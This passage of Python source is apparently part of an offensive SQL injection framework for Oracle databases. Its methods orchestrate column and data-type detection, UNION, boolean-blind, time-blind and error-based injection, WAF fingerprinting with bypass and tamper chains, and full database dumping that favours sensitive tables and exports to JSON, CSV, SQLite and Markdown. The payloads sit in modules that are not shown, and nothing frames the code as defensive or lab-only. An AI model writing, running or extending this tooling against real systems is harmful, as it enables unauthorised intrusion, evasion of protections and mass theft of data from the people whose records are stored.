    # Phase 9: Column Detection Methods
    # ============================================================

    def detect_columns(
        self, injection_point: str, max_columns: int = 30
    ) -> ColumnDetectionResult:
        """Detect column count and reflective columns."""
        self.logger.info("[OracleEnum] Detecting columns...")
        return self.column_detector.detect_column_count(injection_point, max_columns)

    def get_column_count(self, injection_point: str) -> int:
        """Get the number of columns."""
        if self.detection_result and self.detection_result.column_detection:
            return self.detection_result.column_detection.column_count
        result = self.column_detector.detect_column_count(injection_point)
        return result.column_count if result.success else 0

    def get_reflective_columns(self, injection_point: str) -> List[int]:
        """Get reflective column indices."""
        if self.detection_result and self.detection_result.column_detection:
            return self.detection_result.column_detection.reflective_columns
        result = self.column_detector.detect_column_count(injection_point)
        return result.reflective_columns if result.success else []

    def get_union_payload(self, injection_point: str) -> Optional[str]:
        """Get the best UNION payload."""
        return self.column_detector.get_best_union_payload(injection_point)

    # ============================================================
    # Phase 10: Data Type Detection Methods
    # ============================================================

    def detect_datatypes(
        self, injection_point: str, column_count: Optional[int] = None
    ) -> DataTypeDetectionResult:
        """Detect data types for all columns."""
        self.logger.info("[OracleEnum] Detecting data types...")
        return self.datatype_detector.detect_column_types(injection_point, column_count)

    def get_best_union_payload_dt(
        self, injection_point: str, column_count: Optional[int] = None
    ) -> Optional[str]:
        """Get the best UNION payload from data type detection."""
        return self.datatype_detector.get_best_union_payload(
            injection_point, column_count
        )

    def get_reflective_column_dt(
        self, injection_point: str, column_count: Optional[int] = None
    ) -> Optional[int]:
        """Get the best reflective column from data type detection."""
        return self.datatype_detector.get_reflective_column(
            injection_point, column_count
        )

    def verify_union_payload(self, injection_point: str, payload: str) -> bool:
        """Verify a UNION payload works."""
        return self.datatype_detector.verify_payload(injection_point, payload)

    # ============================================================
    # Phase 11: Blind Boolean Methods
    # ============================================================

    def detect_blind_boolean(self, injection_point: str) -> BlindBooleanResult:
        """Detect boolean-based blind SQL injection."""
        self.logger.info("[OracleEnum] Detecting boolean blind SQL injection...")
        return self.blind_boolean_engine.detect_boolean_blind(injection_point)

    def is_boolean_vulnerable(self, injection_point: str) -> bool:
        """Check if parameter is vulnerable to boolean blind injection."""
        self.logger.info("[OracleEnum] Checking boolean blind vulnerability...")
        return self.blind_boolean_engine.is_boolean_vulnerable(injection_point)

    def get_best_boolean_payload(self, injection_point: str) -> Optional[str]:
        """Get the best boolean payload."""
        self.logger.info("[OracleEnum] Getting best boolean payload...")
        return self.blind_boolean_engine.get_best_boolean_payload(injection_point)

    def compare_boolean_payloads(
        self, injection_point: str, true_payload: str, false_payload: str
    ) -> Dict[str, Any]:
        """Compare true and false boolean payloads."""
        self.logger.info("[OracleEnum] Comparing boolean payloads...")
        return self.blind_boolean_engine.compare_true_false(
            injection_point, true_payload, false_payload
        )

    # ============================================================
    # Phase 12: Time Blind Methods
    # ============================================================

    def detect_time_blind(
        self, injection_point: str, delays: Optional[List[int]] = None
    ) -> TimeBlindResult:
        """Detect time-based blind SQL injection."""
        self.logger.info("[OracleEnum] Detecting time blind SQL injection...")
        return self.time_blind_engine.detect_time_blind(injection_point, delays)

    def is_time_based_vulnerable(self, injection_point: str) -> bool:
        """Check if parameter is vulnerable to time-based injection."""
        self.logger.info("[OracleEnum] Checking time-based vulnerability...")
        return self.time_blind_engine.is_time_based_vulnerable(injection_point)

    def get_best_time_payload(self, injection_point: str) -> Optional[str]:
        """Get the best time-based payload."""
        self.logger.info("[OracleEnum] Getting best time payload...")
        return self.time_blind_engine.get_best_time_payload(injection_point)

    def measure_response_time(
        self,
        injection_point: str,
        payload: Optional[str] = None,
        num_measurements: int = 3,
    ) -> float:
        """Measure response time for a payload."""
        self.logger.info("[OracleEnum] Measuring response time...")
        avg, _ = self.time_blind_engine._measure_response_time(
            injection_point, payload, num_measurements
        )
        return avg

    # ============================================================
    # Phase 13: Error Based Methods
    # ============================================================

    def detect_error_based(self, injection_point: str) -> ErrorBasedResult:
        """Detect error-based SQL injection."""
        self.logger.info("[OracleEnum] Detecting error-based SQL injection...")
        return self.error_based_engine.detect_error_based(injection_point)

    def is_error_based(self, injection_point: str) -> bool:
        """Check if parameter is vulnerable to error-based injection."""
        self.logger.info("[OracleEnum] Checking error-based vulnerability...")
        return self.error_based_engine.is_error_based(injection_point)

    def get_best_error_payload(self, injection_point: str) -> Optional[str]:
        """Get the best error-based payload."""
        self.logger.info("[OracleEnum] Getting best error payload...")
        return self.error_based_engine.get_best_error_payload(injection_point)

    def extract_error_data(self, injection_point: str, payload: str) -> List[str]:
        """Extract data from error message using a payload."""
        self.logger.info("[OracleEnum] Extracting error data...")
        return self.error_based_engine.extract_error_data(injection_point, payload)

    # ============================================================
    # Phase 14: WAF Methods
    # ============================================================

    def detect_waf(self, injection_point: Optional[str] = None) -> WAFDetectionResult:
        """Detect and fingerprint WAF."""
        self.logger.info("[OracleEnum] Detecting WAF...")
        return self.waf_detector.detect(injection_point)

    def is_waf_present(self, injection_point: Optional[str] = None) -> bool:
        """Check if WAF is present."""
        self.logger.info("[OracleEnum] Checking WAF presence...")
        return self.waf_detector.is_waf_present(injection_point)

    def get_waf_name(self, injection_point: Optional[str] = None) -> Optional[str]:
        """Get detected WAF name."""
        self.logger.info("[OracleEnum] Getting WAF name...")
        return self.waf_detector.get_waf_name(injection_point)

    def get_waf_bypass_recommendations(
        self, injection_point: Optional[str] = None
    ) -> List[str]:
        """Get WAF bypass recommendations."""
        self.logger.info("[OracleEnum] Getting WAF bypass recommendations...")
        return self.waf_detector.get_bypass_recommendations(injection_point)

    # ============================================================
    # Phase 15: Tamper Methods
    # ============================================================

    def apply_tamper(self, payload: str, tamper_name: str) -> TamperResult:
        """Apply a single tamper to a payload."""
        self.logger.info(f"[OracleEnum] Applying tamper: {tamper_name}")
        return self.tamper_engine.apply(payload, tamper_name)

    def apply_tamper_chain(self, payload: str, tamper_chain: List[str]) -> TamperResult:
        """Apply multiple tampers in sequence."""
        self.logger.info(f"[OracleEnum] Applying tamper chain: {tamper_chain}")
        return self.tamper_engine.apply_chain(payload, tamper_chain)

    def recommend_tampers(self, waf_name: str) -> List[str]:
        """Recommend tampers for a specific WAF."""
        self.logger.info(f"[OracleEnum] Getting tamper recommendations for: {waf_name}")
        return self.tamper_engine.recommend_tampers(waf_name)

    def list_tampers(self) -> List[str]:
        """List all available tamper methods."""
        self.logger.info("[OracleEnum] Listing available tampers")
        return self.tamper_engine.list_tampers()

    def get_tamper_confidence(self, tamper_name: str) -> int:
        """Get confidence score for a tamper."""
        self.logger.info(f"[OracleEnum] Getting tamper confidence: {tamper_name}")
        return self.tamper_engine.get_tamper_confidence(tamper_name)

    def test_tamper(self, payload: str, tamper_name: str) -> bool:
        """Test if a tamper modifies the payload."""
        self.logger.info(f"[OracleEnum] Testing tamper: {tamper_name}")
        return self.tamper_engine.test_tamper(payload, tamper_name)

    # ============================================================
    # Phase 16: UNION Exploit Methods
    # ============================================================

    def exploit_union(
        self, injection_point: str, waf_name: Optional[str] = None
    ) -> UnionExploitResult:
        """Perform UNION-based SQL injection exploitation."""
        self.logger.info("[OracleEnum] Starting UNION exploitation...")
        return self.union_exploiter.exploit(injection_point, waf_name)

    def find_working_payload(
        self, injection_point: str, waf_name: Optional[str] = None
    ) -> Optional[str]:
        """Find a working UNION payload."""
        self.logger.info("[OracleEnum] Finding working payload...")
        return self.union_exploiter.find_best_payload(injection_point, waf_name)

    def get_best_union_payload(self) -> Optional[str]:
        """Get the best working UNION payload."""
        self.logger.info("[OracleEnum] Getting best UNION payload...")
        return self.union_exploiter.get_best_payload()

    def get_union_column_count(self) -> int:
        """Get the detected column count."""
        return self.union_exploiter.column_count

    # ============================================================
    # Phase 17: Database Dumper Methods
    # ============================================================

    def _ensure_dumper(self, injection_point: str) -> OracleDatabaseDumper:
        """Ensure database dumper is initialized."""
        if self.database_dumper is None:
            self.database_dumper = OracleDatabaseDumper(
                self.session, self.base_url, injection_point, self.logger
            )
        return self.database_dumper

    def dump_database(
        self,
        injection_point: str,
        max_schemas: int = 20,
        max_tables: int = 50,
        max_rows: Optional[int] = None,
        blacklist: Optional[Set[str]] = None,
        whitelist: Optional[Set[str]] = None,
        prioritize_sensitive: bool = True,
        resume: bool = False,
    ) -> DatabaseDumpResult:
        """Dump the entire database."""
        self.logger.info("[OracleEnum] Starting database dump...")
        dumper = self._ensure_dumper(injection_point)
        result = dumper.dump_database(
            max_schemas=max_schemas,
            max_tables=max_tables,
            max_rows=max_rows,
            blacklist=blacklist,
            whitelist=whitelist,
            prioritize_sensitive=prioritize_sensitive,
            resume=resume,
        )
        if self.detection_result:
            self.detection_result.dump_result = result
        return result

    def dump_table(
        self,
        injection_point: str,
        schema: str,
        table: str,
        max_rows: Optional[int] = None,
    ) -> List[Dict[str, Any]]:
        """Dump a single table."""
        self.logger.info(f"[OracleEnum] Dumping table: {schema}.{table}")
        dumper = self._ensure_dumper(injection_point)
        return dumper.dump_table(schema, table, max_rows)

    def dump_schema(
        self,
        injection_point: str,
        schema: str,
        tables: Optional[List[str]] = None,
        max_rows: Optional[int] = None,
    ) -> Dict[str, List[Dict[str, Any]]]:
        """Dump all tables in a schema."""
        self.logger.info(f"[OracleEnum] Dumping schema: {schema}")
        dumper = self._ensure_dumper(injection_point)
        return dumper.dump_schema(schema, tables, max_rows)

    def export_dump_json(self, injection_point: str, output_path: str) -> str:
        """Export dump to JSON."""
        dumper = self._ensure_dumper(injection_point)
        if dumper.dump_result is None:
            self.logger.warning("[OracleEnum] No dump result to export")
            return ""
        return dumper.export_json(dumper.dump_result, output_path)

    def export_dump_csv(self, injection_point: str, output_dir: str) -> List[str]:
        """Export dump to CSV files."""
        dumper = self._ensure_dumper(injection_point)
        if dumper.dump_result is None:
            self.logger.warning("[OracleEnum] No dump result to export")
            return []
        return dumper.export_csv(dumper.dump_result, output_dir)

    def export_dump_sqlite(self, injection_point: str, output_path: str) -> str:
        """Export dump to SQLite database."""
        dumper = self._ensure_dumper(injection_point)
        if dumper.dump_result is None:
            self.logger.warning("[OracleEnum] No dump result to export")
            return ""
        return dumper.export_sqlite(dumper.dump_result, output_path)

    def export_dump_markdown(self, injection_point: str, output_path: str) -> str:
        """Export dump to Markdown."""
        dumper = self._ensure_dumper(injection_point)
        if dumper.dump_result is None:
            self.logger.warning("[OracleEnum] No dump result to export")
            return ""
        return dumper.export_markdown(dumper.dump_result, output_path)

    def get_dump_progress(self, injection_point: str) -> Dict[str, Any]:
        """Get current dump progress."""
        dumper = self._ensure_dumper(injection_point)
        return dumper.track_progress()
